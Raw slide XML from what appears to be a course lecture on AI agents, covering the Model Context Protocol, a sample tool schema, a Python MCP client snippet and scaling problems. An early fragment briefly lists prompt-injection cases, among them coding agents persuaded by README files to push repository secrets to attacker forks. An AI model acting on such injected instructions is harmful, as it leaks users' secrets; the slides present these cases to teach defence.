                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>&lt;img&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> tags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markdown the model was asked to summarize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Bing Chat tricked into revealing its full system prompt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Coding agents persuaded by README files to push their own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repo's secrets to attacker-controlled forks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This i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>s SQL injection, in English, against an LLM.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mitigation isn't "better filter." It's the same lesson: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U</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ntrusted input must not become part of the program's structure.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="60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418"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="419" name="Google Shape;419;g3ec891ba402_1_0"/>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Tools you didn't write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4"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="425" name="Google Shape;425;g3ec891ba402_1_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Most of the tools you want already exist</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="426" name="Google Shape;426;g3ec891ba402_1_12"/>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Here's the thing - somebody already wrote the GitHub tool,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Postgres tool, the Slack tool, the browser tool, and they keep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them working as those APIs change. You don't want to reinvent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any of that, and you really don't want to maintain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MCP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> (the Model Context Protocol) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>- standard for plugging in others’ tools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T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>he</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>tools move OUT of your code and into a separate </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000">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Y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>our agent becomes a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>client</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> that connects to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four-step round-trip from earlier doesn't change.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MCP standardizes WHERE the tools live and how you ask for them</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000">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A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ny agent can talk to any server without custom glue.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1"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="432" name="Google Shape;432;g3ec891ba402_1_1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An MCP server hands your agent this. What is it?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="433" name="Google Shape;433;g3ec891ba402_1_18"/>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JSON</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="434" name="Google Shape;434;g3ec891ba402_1_1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5" name="Google Shape;435;g3ec891ba402_1_18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="1645920"/>
            <a:ext cx="101799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"name": "create_issue",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"description": "Open a new issue on a GitHub repository.",</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"input_schema":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"type": "object",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"properties":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"repo":  {"type": "string"},</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"title": {"type": "string"},</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"body":  {"type": "string"}</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"required": ["repo", "title"]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You didn't write this tool. The GitHub MCP server did. So what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IS this blob, and where have you seen its exact shape before?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0"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="441" name="Google Shape;441;g3ec891ba402_1_26"/>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Connecting to a server: the tools just show up</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="442" name="Google Shape;442;g3ec891ba402_1_26"/>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443" name="Google Shape;443;g3ec891ba402_1_26"/>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4" name="Google Shape;444;g3ec891ba402_1_26"/>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333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>from mcp import ClientSession, StdioServerParameters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from mcp.client.stdio import stdio_client</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Launch someone else's GitHub server and connect to it</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params = StdioServerParameters(command="npx",</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args=["-y", "@modelcontextprotocol/server-github"])</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async with stdio_client(params) as (read, write):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async with ClientSession(read, write) as session:</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await session.initialize()</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"What tools do you have?" -&gt; a list of schemas like the</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last slide. Hand them straight to the model as its tools.</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tools = await session.list_tools()</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="14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When the model picks one, you route the call to the SERVER</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 instead of running your own function.</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await session.call_tool("create_issue", {"repo": "...",</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>                                                 "title":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9"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="450" name="Google Shape;450;g3ec891ba402_1_3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Works in both directions</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="451" name="Google Shape;451;g3ec891ba402_1_34"/>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Consuming</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>on the prior slide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Y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>our agent connects to servers other people maintain - GitHub, a database, a browser.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 tool list grows without you writing any tools.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Exposing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="non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goes the other way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Y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ou wrap YOUR app as an MCP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Now someone else's agent - Claude Desktop,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Cursor, whatever - can use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 second one is a real option for your final project.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Expose a couple of your app's actions as MCP tools and you can drive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whole thing from Claude Desktop, no UI required - which is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pretty different way to think about what your app even IS.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6"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="457" name="Google Shape;457;g3ec891ba402_1_4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Every server you add is more authorized access</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="458" name="Google Shape;458;g3ec891ba402_1_40"/>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Straight back to the tools-are-authorized-access idea, because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MCP raises the stakes on it. When you connect a server, you're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handing its tools - and whoever wrote them - the same standing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your agent that your own functions have.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And now it's literally </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>someone else's code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> running on your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behalf, often as a process on your machine. A sketchy MCP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is a sketchy dependency that can also read whatever you point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 agent at - same trust question as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Courier Prime"/>
                <a:ea typeface="Courier Prime"/>
                <a:cs typeface="Courier Prime"/>
                <a:sym typeface="Courier Prime"/>
              </a:rPr>
              <a:t>npm install</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>, bigger blast</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>radius.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C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>onnect servers you'd vouch for, keep the dangerous ones </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>sandboxed.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E</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>very server and to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> you add widens what a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>prompt-injected agent could reach.</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463"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="464" name="Google Shape;464;p24"/>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Where this goes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9"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="470" name="Google Shape;470;p2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Cursor and Claude Code are this loop, bigger</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="471" name="Google Shape;471;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="3986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So here's what's actually inside the agent you've been leaning on all semester.</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same loop - append to messages, call the model, parse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response, run the tools, repeat.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much longer tool list - read, write, edit, bash, glob, grep,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web fetch, sometimes browser control, sometimes more.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Sharper prompting, and a system prompt that knows your codebase.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permission system that gates the destructive tools.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Some context management to survive really long sessions.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1" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Everything else is just tools, polish, optimizations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6"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="477" name="Google Shape;477;g3ec891ba402_1_20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gets harder at scale</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="478" name="Google Shape;478;g3ec891ba402_1_204"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="200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handful of things start to bite once the tool list grows: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Tool selection.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> With a few tools the model almost always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picks the right one. With 50 it starts picking wrong, so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descriptions matter way more and sometimes you end up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splitting tools into groups or defer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> loading them.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="479" name="Google Shape;479;g3ec891ba402_1_204"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3332395" y="3677925"/>
            <a:ext cx="5299200" cy="26733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485" name="Google Shape;485;g3ec891ba402_1_2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gets harder at scale</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="486" name="Google Shape;486;g3ec891ba402_1_212"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="190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handful of things start to bite once the tool list grows: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Context length.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> Long sessions just eat tokens - you're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re-sending the whole history every turn, so eventually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have to summarize</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>, cache,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> or trim it </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>or you spend lots of dollars and time.</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endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="487" name="Google Shape;487;g3ec891ba402_1_212"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1743200" y="3301850"/>
            <a:ext cx="9050500" cy="23941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2"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="493" name="Google Shape;493;p2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gets harder at scale</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="494" name="Google Shape;494;p26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="1616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handful of things start to bite once the tool list grows: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Error recovery.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> Tools fail - files don't exist, commands </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>error out, the network drops.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good agent reads the error</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>and tries something else; a bad one gives up or just loops.</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This requires you to provide good errors…</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:srgbClr val="666677"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="495" name="Google Shape;495;p26"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1684250" y="3526122"/>
            <a:ext cx="8415776" cy="2471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sp>
        <p:nvSpPr>
          <p:cNvPr id="501" name="Google Shape;501;p2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this goes next</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="502" name="Google Shape;502;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
